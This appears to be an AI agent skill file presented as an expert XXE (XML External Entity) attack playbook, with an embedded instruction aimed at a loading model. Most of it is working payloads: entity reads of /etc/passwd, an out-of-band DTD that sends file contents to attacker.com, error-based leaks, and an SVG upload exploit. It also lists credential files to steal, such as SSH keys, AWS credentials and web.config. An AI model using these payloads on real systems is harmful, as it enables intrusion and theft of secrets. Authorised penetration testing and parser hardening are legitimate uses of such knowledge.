---
name: xxe-xml-external-entity
description: 0. RELATED ROUTING
when-to-use: >-
  XXE playbook. Use when XML, SVG, OOXML, SOAP, or parser-driven imports may resolve external entities, files, or internal network resources.
---

# SKILL: XML External Entity Injection (XXE) — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert XXE techniques. Covers all injection contexts (SOAP, REST JSON→XML parsers, Office files, SVG), OOB exfiltration (critical when direct read fails), blind XXE detection, and XXE-to-SSRF chain. Base models often miss OOB and non-XML context XXE. For real-world CVE chains, Office docx XXE step-by-step, PHP expect:// RCE, and Solr XXE+RCE, load the companion [SCENARIOS.md](./SCENARIOS.md).

## 0. RELATED ROUTING

Also load:

- [upload insecure files](../upload-insecure-files/SKILL.md) when XXE is reachable through SVG, OOXML, import, or preview pipelines

### Extended Scenarios

Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
- Apache Solr XXE + RCE chain (CVE-2017-12629) — XXE to read config, then VelocityResponseWriter for RCE
- Office docx XXE step-by-step — unzip → inject DOCTYPE into `word/document.xml` or `[Content_Types].xml` → repackage → upload
- DOCTYPE-based blind SSRF — `PUBLIC` external DTD reference triggers HTTP callback without entity reflection
- PHP `expect://` protocol via XXE — direct command execution when expect extension is installed
- Blind XXE via error messages — force file path error that leaks content in exception text
- XXE in SOAP web services — inject entities into SOAP Envelope/Body elements

---

## 1. CLASSIC XXE PAYLOAD

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

If `/etc/passwd` reflects in response → confirmed file read.

---

## 2. ATTACK SURFACE DISCOVERY

### Direct XML Inputs
- SOAP endpoints (`text/xml`, `application/soap+xml`)
- REST APIs accepting `application/xml`
- File upload: `.xlsx`, `.docx`, `.pptx` (Office Open XML)
- SVG uploads (SVG is XML)
- RSS/Atom feed parsers
- Web services with XML config import

### Non-Obvious XML Processing
Change `Content-Type` header on **any** JSON POST to:
```
Content-Type: application/xml
```
Then rewrite body as XML — many backends use dual-format parsers or auto-detect.

### PDF Generators
Some HTML→PDF tools (wkhtmltopdf, PrinceXML) execute SSRF via embedded URLs but also parse external entities in SVG/XML included in the HTML.

---

## 3. OOB (OUT-OF-BAND) XXE — CRITICAL

Use when direct entity reflection fails (server parses but doesn't echo entity content):

### Step 1: Blind detection
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP_COLLABORATOR/">]>
<root>&xxe;</root>
```
DNS/HTTP hit to collaborator → confirms XXE (even if no file content returned).

### Step 2: OOB file exfiltration via attacker-hosted DTD
**Attacker's server hosts a malicious DTD** at `http://attacker.com/evil.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%exfil;
```

**Payload sent to target**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&exfiltrate;</root>
```
File contents appear in attacker's HTTP server request log.

### Step 3: Error-based OOB (alternative when HTTP blocked)
Use intentional error to leak data in error message:
```xml
<!-- attacker.com/error.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///NONEXISTENT/%file;'>">
%eval;
%error;
```

---

## 4. XXE FILE READ TARGETS

**Linux**:
```
/etc/passwd
/etc/shadow  (requires root)
/etc/hosts
/proc/self/environ      ← environment variables (DB creds, API keys)
/proc/self/cmdline      ← process command line
/var/log/apache2/access.log  ← may contain passwords in URLs
/home/USER/.ssh/id_rsa  ← SSH private key
/home/USER/.aws/credentials ← AWS keys
/home/USER/.bash_history
```

**Windows**:
```
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config    ← ASP.NET connection strings
C:\xampp\htdocs\wp-config.php    ← WordPress DB credentials
C:\Users\Administrator\.ssh\id_rsa
```

---

## 5. SVG XXE (file upload context)

When SVG uploads are accepted and served/processed:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="100">
  <text font-size="16">&xxe;</text>
</svg>
```
Upload as `.svg` → `GET /uploads/file.svg` → file contents in response.

---

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
